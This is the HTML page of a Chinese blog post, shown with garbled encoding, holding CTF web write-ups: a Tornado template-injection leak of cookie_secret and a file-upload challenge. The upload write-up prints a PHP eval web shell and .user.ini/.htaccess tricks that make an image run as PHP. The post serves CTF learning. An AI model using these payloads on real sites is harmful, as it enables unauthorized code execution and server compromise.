

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="å¥‡æ€ªçš„å¥‡æ€ª">
  <meta name="keywords" content="">
  
    <meta name="description" content="[æŠ¤ç½‘æ¯ 2018]easy_tornado 1è¿›å…¥ç­”é¢˜é¡µé¢ï¼Œå‘ç°ä¸‰ä¸ªè¶…é“¾æ¥åˆ†åˆ«ç‚¹å‡»è¿›å»å†ç‚¹å‡»è¿›å»åurlä¸­ä¼ è¾“äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯filenameï¼Œå¦ä¸€ä¸ªæ˜¯filehashï¼Œåœ¨ç¬¬ä¸€ä¸ªflag.txtä¸­æŠŠfilenameæ”¹ä¸ºæç¤ºçš„&#x2F;fllllllllllllagè¯•è¯•æäº¤åé¡µé¢æ˜¾ç¤ºerrorçœ‹æ¥æ‹¿åˆ°flagçš„å…³é”®å°±åœ¨äºè§£å‡ºfilehashæ˜¯ä»€ä¹ˆï¼Œæ ¹æ®ç¬¬ä¸‰ä¸ªè¶…é“¾æ¥çš„æç¤ºï¼Œåº”è¯¥æ˜¯filehash">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf_web">
<meta property="og:url" content="http://example.com/2023/12/20/buuctf_web/index.html">
<meta property="og:site_name" content="å¥‡æ€ªçš„äºšç´¢">
<meta property="og:description" content="[æŠ¤ç½‘æ¯ 2018]easy_tornado 1è¿›å…¥ç­”é¢˜é¡µé¢ï¼Œå‘ç°ä¸‰ä¸ªè¶…é“¾æ¥åˆ†åˆ«ç‚¹å‡»è¿›å»å†ç‚¹å‡»è¿›å»åurlä¸­ä¼ è¾“äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯filenameï¼Œå¦ä¸€ä¸ªæ˜¯filehashï¼Œåœ¨ç¬¬ä¸€ä¸ªflag.txtä¸­æŠŠfilenameæ”¹ä¸ºæç¤ºçš„&#x2F;fllllllllllllagè¯•è¯•æäº¤åé¡µé¢æ˜¾ç¤ºerrorçœ‹æ¥æ‹¿åˆ°flagçš„å…³é”®å°±åœ¨äºè§£å‡ºfilehashæ˜¯ä»€ä¹ˆï¼Œæ ¹æ®ç¬¬ä¸‰ä¸ªè¶…é“¾æ¥çš„æç¤ºï¼Œåº”è¯¥æ˜¯filehash">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/0AYQ%25Q.png">
<meta property="og:image" content="http://example.com/images/0C.png">
<meta property="og:image" content="http://example.com/images/17dc88e290814aba95813a751925fb5f.png">
<meta property="og:image" content="http://example.com/images/ZMS.png">
<meta property="og:image" content="http://example.com/images/5334f6e91090438aaa0ac22c05c26768.png">
<meta property="og:image" content="http://example.com/images/d2702883750b44daaabc93abd5f3255a.png">
<meta property="og:image" content="http://example.com/images/Q2I.png">
<meta property="og:image" content="http://example.com/images/HQC2E6.png">
<meta property="og:image" content="http://example.com/images/DJ.png">
<meta property="og:image" content="http://example.com/images/Y7CUL3CBL.png">
<meta property="og:image" content="http://example.com/images/DKORO.png">
<meta property="og:image" content="http://example.com/images/G3HD33.png">
<meta property="og:image" content="http://example.com/images/TMK81DK.png">
<meta property="og:image" content="http://example.com/images/4RO.png">
<meta property="og:image" content="http://example.com/images/YKR.png">
<meta property="og:image" content="http://example.com/images/VNTXAGU.png">
<meta property="og:image" content="http://example.com/images/16B3IU.png">
<meta property="og:image" content="http://example.com/images/M3HJZ8NQ67JFV.png">
<meta property="og:image" content="http://example.com/images/XNP4L0FHEL.png">
<meta property="og:image" content="http://example.com/images/20210407185102246.png">
<meta property="og:image" content="http://example.com/images/CJBVJ1.png">
<meta property="og:image" content="http://example.com/images/GK.png">
<meta property="og:image" content="http://example.com/images/9DRO.png">
<meta property="og:image" content="http://example.com/images/9WKWG.png">
<meta property="og:image" content="http://example.com/images/1UZPE.png">
<meta property="og:image" content="http://example.com/images/VT8D.png">
<meta property="og:image" content="http://example.com/images/8BNM.png">
<meta property="og:image" content="http://example.com/images/G3.png">
<meta property="og:image" content="http://example.com/images/P45UMTRF.png">
<meta property="og:image" content="http://example.com/images/U5SYBY1GKWV.png">
<meta property="og:image" content="http://example.com/images/8HOSK.png">
<meta property="og:image" content="http://example.com/images/L64.png">
<meta property="og:image" content="http://example.com/images/N7R0.png">
<meta property="og:image" content="http://example.com/images/Y276WNW.png">
<meta property="og:image" content="http://example.com/images/LG.png">
<meta property="og:image" content="http://example.com/images/IR6X2.png">
<meta property="og:image" content="http://example.com/images/Q560M.png">
<meta property="og:image" content="http://example.com/images/WLVRMOO2ZVHZ1IHR1E.png">
<meta property="og:image" content="http://example.com/images/FISBFG6M8XZVKJ8.png">
<meta property="og:image" content="http://example.com/images/ZQSBGIA79FQDV2.png">
<meta property="og:image" content="http://example.com/images/XR86EVQQXJ4OGAGCIE6.png">
<meta property="og:image" content="http://example.com/images/VR1N6OQCRZJXPPOO7AQX.png">
<meta property="og:image" content="http://example.com/images/M4DDC2IQVG3UJ5UHXDSK.png">
<meta property="og:image" content="http://example.com/images/FGQ77UZZI9ZN0I.png">
<meta property="og:image" content="http://example.com/images/Q18QQU2TN4NTI9VNSA0.png">
<meta property="og:image" content="http://example.com/images/RDZVO40JRJ84SIYW.png">
<meta property="og:image" content="http://example.com/images/5ENMQE2LCM1KOF03JQ8.png">
<meta property="og:image" content="http://example.com/images/LJ7EPLUC0WFRYGH.png">
<meta property="og:image" content="http://example.com/images/12M2VGZKUFL40.png">
<meta property="og:image" content="http://example.com/images/S3IOWE9SGW1BLCJK5.png">
<meta property="og:image" content="http://example.com/images/VSCRU5OH75NYS3N.png">
<meta property="og:image" content="http://example.com/images/NY0S07MJ2GOIRTM3AJF.png">
<meta property="og:image" content="http://example.com/images/CK8BJG03EQERY8O69T0.png">
<meta property="og:image" content="http://example.com/images/MLC6SAFLMOJVT39WPR.png">
<meta property="og:image" content="http://example.com/images/JMFRP9VYT5A0VKQDORT.png">
<meta property="og:image" content="http://example.com/images/XXQ3LARFHLVNSZQEEQW.png">
<meta property="og:image" content="http://example.com/images/G1EYMWNMMY6OS2BF0.png">
<meta property="og:image" content="http://example.com/images/XZ69C0YPOUN95B37GM.png">
<meta property="og:image" content="http://example.com/images/JNSYNMWR0M0GM7R.png">
<meta property="og:image" content="http://example.com/images/UK82BH2SOKD0KWXEE9F6U.png">
<meta property="og:image" content="http://example.com/images/0F4A1WUAHEN3Y59N.png">
<meta property="og:image" content="http://example.com/images/TLFZIYE71LUDA05O.png">
<meta property="og:image" content="http://example.com/images/0UOK26JNCRDJ39EQSF.png">
<meta property="og:image" content="http://example.com/images/XXRMNSDFETL2IUQW.png">
<meta property="og:image" content="http://example.com/images/61b42a16c2b405e6ab1ada36470713f1.png">
<meta property="og:image" content="http://example.com/images/B08XOX2WGAPXVUVF5.png">
<meta property="og:image" content="http://example.com/images/AZJKHF8MYLVSXY26LX.png">
<meta property="og:image" content="http://example.com/images/JCTE5HBQ6IX0LVB42K.png">
<meta property="og:image" content="http://example.com/images/O7TO6JUWTEDZZKGNI8.png">
<meta property="og:image" content="http://example.com/images/WHMHWO5NM9TXT02WL.png">
<meta property="og:image" content="http://example.com/images/SCSFCWCUQ0RRMHNUTV.png">
<meta property="og:image" content="http://example.com/images/GSFC2R2VJOYPWHQ8WJR.png">
<meta property="og:image" content="http://example.com/images/W79NAB1O0JIUAANS4SU5O.png">
<meta property="og:image" content="http://example.com/images/MQ083D130OO6OYCG15V.png">
<meta property="og:image" content="http://example.com/images/YNUL3D1EKV4C5VP4.png">
<meta property="og:image" content="http://example.com/images/Y1HGFWJWYOPXT3ZN3L.png">
<meta property="og:image" content="http://example.com/images/6OLV4250O66RIYHW5SM.png">
<meta property="og:image" content="http://example.com/images/JFJQBMOYHR56UBL4MK.png">
<meta property="og:image" content="http://example.com/images/HHE63JPRZK5VP8UO.png">
<meta property="og:image" content="http://example.com/images/CCBM03PTUN15DEK50F.png">
<meta property="og:image" content="http://example.com/images/SJJVW90CRI7BP0MK.png">
<meta property="og:image" content="http://example.com/images/435G6RU5DA6HCN26.png">
<meta property="og:image" content="http://example.com/images/LQ1B771Y202IYPQOL.png">
<meta property="og:image" content="http://example.com/images/D585S3GQB0CTVOHB9L.png">
<meta property="og:image" content="http://example.com/images/IZ87OSEJ633X4O7QBBE.png">
<meta property="og:image" content="http://example.com/images/NMW9LJLO5NYALOX.png">
<meta property="og:image" content="http://example.com/images/RT4UKBT5P80RZT5.png">
<meta property="og:image" content="http://example.com/images/LLNDIZB7VBGLF9K12S.png">
<meta property="og:image" content="http://example.com/images/LK7HQZB5I2M18ONT.png">
<meta property="og:image" content="http://example.com/images/PT26X6LGOGY57QTEN2.png">
<meta property="og:image" content="http://example.com/images/XCUV93B45O8I24U3VXW2.png">
<meta property="og:image" content="http://example.com/images/U30NAQ0SZE9VDQ7O.png">
<meta property="og:image" content="http://example.com/images/YCMFTEQZQ5AMTYVRU31.png">
<meta property="og:image" content="http://example.com/images/G35F0ZJN35S68IL67.png">
<meta property="og:image" content="http://example.com/images/J3D1FCKLD0WT7OLY5XN.png">
<meta property="og:image" content="http://example.com/images/61b42a16c2b405e6ab1ada36470713f1.png">
<meta property="og:image" content="http://example.com/images/RJAZ6GRSWBE8ZLSC6R.png">
<meta property="og:image" content="http://example.com/images/DY839XW0HNZF8LACB1OZG.png">
<meta property="og:image" content="http://example.com/images/NGOSYM3EL5ZN0KAAQ.png">
<meta property="og:image" content="http://example.com/images/VYY7B6N5IKE3WV71CVL.png">
<meta property="og:image" content="http://example.com/images/DJQB0VOJ373PVHM.png">
<meta property="og:image" content="http://example.com/images/ZIZM27JBL9XG2SZ5Y.png">
<meta property="og:image" content="http://example.com/images/QEKBJT3PLILCFXS6L7BG.png">
<meta property="og:image" content="http://example.com/images/B5YT537OKAX6WR7R5O.png">
<meta property="og:image" content="http://example.com/images/IB0WVFS4XJ9N847G.png">
<meta property="og:image" content="http://example.com/images/DAMXIM6X4N91NEI.png">
<meta property="og:image" content="http://example.com/images/FZ806UV2QR1V9VG2.png">
<meta property="og:image" content="http://example.com/images/MUW7PLXTC8KCQ5YHP.png">
<meta property="og:image" content="http://example.com/images/NLRFZRXO510E.png">
<meta property="og:image" content="http://example.com/images/ZJ4P7M6GGO.png">
<meta property="og:image" content="http://example.com/images/EP83OM9ZY8K5GK.png">
<meta property="og:image" content="http://example.com/images/MHS82ETVEKT1RC6.png">
<meta property="og:image" content="http://example.com/images/CVZTGYF5UOP7U2YGKY.png">
<meta property="og:image" content="http://example.com/images/IUW8YX16KKFF6HS.png">
<meta property="og:image" content="http://example.com/images/I1AISR2SJBF6ZWJ4.png">
<meta property="og:image" content="http://example.com/images/IDZ3WZLUP4E34ZIGIN.png">
<meta property="og:image" content="http://example.com/images/FYRDD8A02HBUVNJJFWD.png">
<meta property="og:image" content="http://example.com/images/NUADL8I15TFAOGUYBJE0V.png">
<meta property="og:image" content="http://example.com/images/I1L8OCMS423Q6WG591.png">
<meta property="og:image" content="http://example.com/images/AZEKDNX7SKH3FWH78.png">
<meta property="og:image" content="http://example.com/images/JEBYS4JSYT3P6T3.png">
<meta property="og:image" content="http://example.com/images/RENLJ0UVWDRW3HCA4.png">
<meta property="og:image" content="http://example.com/images/EIMTIHG6GCW38WPEIR.png">
<meta property="og:image" content="http://example.com/images/JVEITI0I8S3UWTV.png">
<meta property="og:image" content="http://example.com/images/80730O6C28XTPBO8R9.png">
<meta property="og:image" content="http://example.com/images/7P3H0XHID45SU1M592.png">
<meta property="og:image" content="http://example.com/images/BOGXTMWDKOVT3N28.png">
<meta property="og:image" content="http://example.com/images/2016410-20200519163717474-1767458536.png">
<meta property="og:image" content="http://example.com/images/2016410-20200519164320071-1957869897.png">
<meta property="og:image" content="http://example.com/images/2016410-20200519164947664-637568242.png">
<meta property="og:image" content="http://example.com/images/I1B1KP1JAETRBPE9A.png">
<meta property="og:image" content="http://example.com/images/JOG2DW2SH1II1WFM.png">
<meta property="og:image" content="http://example.com/images/VD0G2K3MS8WJMY0.png">
<meta property="og:image" content="http://example.com/images/20201203222019541.png">
<meta property="og:image" content="http://example.com/images/QC88QV83GL7BO.png">
<meta property="og:image" content="http://example.com/images/Q2BO12RTCT42RURJXEVW.png">
<meta property="og:image" content="http://example.com/images/KXA7MY8AXFZUXW.png">
<meta property="og:image" content="http://example.com/images/S73VKNZ1Z1VDVZYA.png">
<meta property="og:image" content="http://example.com/images/B4QC95042UQCY2WB.png">
<meta property="og:image" content="http://example.com/images/XKOFAHMGNI3P7XQAKZOOW.png">
<meta property="og:image" content="http://example.com/images/H37HXSCW5QM6ZXX.png">
<meta property="og:image" content="http://example.com/images/B8K9LNDE6H7CN95S.png">
<meta property="og:image" content="http://example.com/images/KZK2SNH27KTYEM6Y.png">
<meta property="og:image" content="http://example.com/images/YVE0N5JFKM9LXPB.png">
<meta property="og:image" content="http://example.com/images/RZX7CIEXRHL29BSAOH.png">
<meta property="og:image" content="http://example.com/images/DHRQ62NL9WHJ3KCS.png">
<meta property="og:image" content="http://example.com/images/F34OP5L5YL70ND5.png">
<meta property="og:image" content="http://example.com/images/XB3KH95A5B5FCPYQ.png">
<meta property="og:image" content="http://example.com/images/JOCO5EUQUU6V8XXB.png">
<meta property="og:image" content="http://example.com/images/S9WS6UXXSXDW65FE.png">
<meta property="og:image" content="http://example.com/images/JBFBSKZY4FWH5KWZ7KC.png">
<meta property="og:image" content="http://example.com/images/V7NOFLUCZI1RNT.png">
<meta property="og:image" content="http://example.com/images/ECFP2LKJ1JB7QPI9LO8.png">
<meta property="og:image" content="http://example.com/images/JNBAT35QJHZPXF.png">
<meta property="og:image" content="http://example.com/images/YLWH6TZTRJ3H32BKER9.png">
<meta property="og:image" content="http://example.com/images/R8M363537PNFDRFIUH.png">
<meta property="og:image" content="http://example.com/images/CHUL1P513UOV9ZY610EI.png">
<meta property="og:image" content="http://example.com/images/P0U5OSG2IY3UT03FE6C.png">
<meta property="og:image" content="http://example.com/images/VCLCNT98$GCXFF8.png">
<meta property="og:image" content="http://example.com/images/JN7XR4QJ48H7LL1I58.png">
<meta property="article:published_time" content="2023-12-19T16:00:00.000Z">
<meta property="article:modified_time" content="2024-02-15T16:02:07.864Z">
<meta property="article:author" content="å¥‡æ€ªçš„å¥‡æ€ª">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/images/0AYQ%25Q.png">
  
  
  
  <title>buuctf_web - å¥‡æ€ªçš„äºšç´¢</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>å¥‡æ€ªçš„äºšç´¢</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="buuctf_web"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-12-20 00:00" pubdate>
          2023å¹´12æœˆ20æ—¥ å‡Œæ™¨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          69k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          572 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">buuctf_web</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado-1"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado-1" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado 1"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado 1</h2><p>è¿›å…¥ç­”é¢˜é¡µé¢ï¼Œå‘ç°ä¸‰ä¸ªè¶…é“¾æ¥<br>åˆ†åˆ«ç‚¹å‡»è¿›å»<br>å†ç‚¹å‡»è¿›å»åurlä¸­ä¼ è¾“äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯filenameï¼Œå¦ä¸€ä¸ªæ˜¯filehashï¼Œåœ¨ç¬¬ä¸€ä¸ªflag.txtä¸­æŠŠfilenameæ”¹ä¸ºæç¤ºçš„&#x2F;fllllllllllllagè¯•è¯•<br><img src="/images/0AYQ%25Q.png" srcset="/img/loading.gif" lazyload><br>æäº¤åé¡µé¢æ˜¾ç¤ºerror<br><img src="/images/0C.png" srcset="/img/loading.gif" lazyload><br>çœ‹æ¥æ‹¿åˆ°flagçš„å…³é”®å°±åœ¨äºè§£å‡ºfilehashæ˜¯ä»€ä¹ˆï¼Œæ ¹æ®ç¬¬ä¸‰ä¸ªè¶…é“¾æ¥çš„æç¤ºï¼Œåº”è¯¥æ˜¯filehash&#x3D;md5(cookie_secret+md5(filename))ï¼Œfilenameç°å·²çŸ¥ï¼Œä½†cookie_secretæ˜¯ä»€ä¹ˆå‘¢ï¼Œè€Œä¸”ç¬¬äºŒä¸ªranderä¹Ÿæ²¡æœ‰ç”¨åˆ°ï¼Œä¹Ÿå¹¶ä¸æ¸…æ¥šæœ‰ä»€ä¹ˆç”¨ï¼Œåªèƒ½å»æŸ¥ä¸€ä¸‹tornadoæ¡†æ¶æœ‰ä»€ä¹ˆç‰¹ç‚¹äº†<br><a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/">tornadoæ¡†æ¶çš„ä»‹ç»</a><br><img src="/images/17dc88e290814aba95813a751925fb5f.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ‘ä»¬åœ¨è¿™ä¸ªæ–‡æ¡£é‡Œé¢å¯ä»¥çŸ¥é“cookie_secretå¹¶ä¸åƒæˆ‘ä»¬çš„cookieä¸€æ ·å¯ä»¥è‡ªå·±ä¿®æ”¹çš„(ä¸æ˜¯è‡ªå·±çš„cookie)ï¼Œè€Œæ˜¯åŒ…å«äº†æ—¶é—´æˆ³ï¼ŒHMACç­¾åå’Œç¼–ç åçš„cookieå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±ä¿®æ”¹cookieå¹¶ä¸ç°å®ã€‚<br>æƒ³åˆ°renderä¼šä¸ä¼šæ˜¯cookie_secretçš„çªç ´ç‚¹ï¼Œæ‰¾ä¸€ä¸‹renderä½œç”¨</p>
<p>renderæ„ä¸ºæ¸²æŸ“;self.render(â€œentry.htmlâ€,entry&#x3D;entry)è¯¥è¯­å¥æ„æ€å°±æ˜¯æ‰¾åˆ°entry.htmlè¿™ä¸ªæ¨¡æ¿ï¼Œç”¨å³è¾¹è¿™ä¸ªentryæ¥å®ä¾‹åŒ–entry.htmlæ¨¡æ¿ä¸­çš„entryå‚æ•°ï¼Œä»è€Œæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚</p>
<p>å›è¿‡å¤´å‘ç°flag.txté‚£ä¸ªErrorçš„é¡µé¢æœ‰ä¸€ä¸ªå‚æ•°msgä¹Ÿæ˜¯ç­‰äºError<br><img src="/images/ZMS.png" srcset="/img/loading.gif" lazyload><br>å‘ç°msgå¯ä»¥å·¦å³é¡µé¢çš„è¾“å‡ºï¼Œæƒ³åˆ°ä¹‹å‰æœ‰äº›é¢˜ç›®åˆ©ç”¨ä¸€ä¸ªå‚æ•°å¯ä»¥å‡ºæ¥phpinfo()ç­‰ï¼Œå› æ­¤ç°åœ¨ç›®æ ‡å°±æ˜¯æ€ä¹ˆåˆ©ç”¨msgè¿™ä¸ªå‚æ•°æ¥æ‰¾åˆ°cookie_secretäº†<br><img src="/images/5334f6e91090438aaa0ac22c05c26768.png" srcset="/img/loading.gif" lazyload><br>åœ¨æ–‡æ¡£ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›¸å…³renderæ¸²æŸ“çš„ä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>&#123;&#123;&#125;&#125;</code> æ¥æŠŠè¡¨è¾¾å¼ä¼ è¿›å»ä»¥è·å–æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œè¿™æ ·æˆ‘ä»¬çŒœæƒ³<code>msg=&#123;&#123;cookieçš„ä½ç½®&#125;&#125;</code>æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„<br><img src="/images/d2702883750b44daaabc93abd5f3255a.png" srcset="/img/loading.gif" lazyload><br>cookie_secretåœ¨Applicationå¯¹è±¡settingsçš„å±æ€§ä¸­ï¼Œè®¿é—®å®ƒçš„è¯å°±éœ€è¦çŸ¥é“å®ƒçš„å±æ€§åå­—ï¼Œæ ¹æ®æŸ¥é˜…å¯çŸ¥ï¼šself.application.settingsæœ‰ä¸€ä¸ªåˆ«åæ˜¯RequestHandler.settingså…¶ä¸­handleråˆæ˜¯æŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡<br>RequestHandler.settingsæŒ‡å‘self.application.settings<br>å› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settings<br><img src="/images/Q2I.png" srcset="/img/loading.gif" lazyload><br>å°†handler.settingå¸¦å…¥msgå³å¯çŸ¥é“cookie_secretï¼Œå†æ¥ä¸€æ­¥æ­¥æ ¹æ®MD5æ¥è®¡ç®—filehash</p>
<p><img src="/images/HQC2E6.png" srcset="/img/loading.gif" lazyload><br>å›åˆ°hints.txt<br>ç°åœ¨å·²ç»çŸ¥é“äº†cookie_secretçš„å€¼ï¼ŒMD5(filename)å°±æ˜¯&#x2F;fllllllllllllagçš„MD5çš„å€¼<br>&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>æŠŠcookie_secretå’ŒMD5(filename)åŠ èµ·æ¥å†è¿›è¡ŒMD5åŠ å¯†å³å¯å¾—å‡ºflag<br><img src="/images/DJ.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢-1"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢-1" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ 1"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ 1</h2><p>è¿™é¢˜æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ é¢˜ï¼ŒæŒ‰ç…§è€æ–¹æ³•å…ˆä¸Šä¼ ä¸€ä¸ªæœ¨é©¬1.png å†…å®¹ï¼š<code>&lt;?php evel($_POST[&#39;a&#39;]);?&gt;</code><br>å†ä¸Šä¼ ä¸€ä¸ª.user.iniï¼šå†…å®¹ä¸º<code>auto_prepend_file=1.png</code> ä¸Šä¼ ä¹‹åä»–ä¼šç»™ä¸€ä¸ªè¿æ¥ï¼Œè¿›å…¥&#x2F;uploadä¹‹åçš„è¿æ¥ï¼Œç”¨èšå‰‘è¿æ¥ä¹Ÿä¸èƒ½æˆåŠŸè¿æ¥ï¼Œä¹Ÿå†™ä¸äº†å‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªæœ‰æ¢ä¸€ç§æ–¹æ³•äº†ã€‚</p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ª1.pngæ–‡ä»¶<br>å†…å®¹ä¸ºï¼š<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>å†ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œ<br>å†…å®¹ä¸ºï¼š<code>SetHandler application/x-httpd-php</code></p>
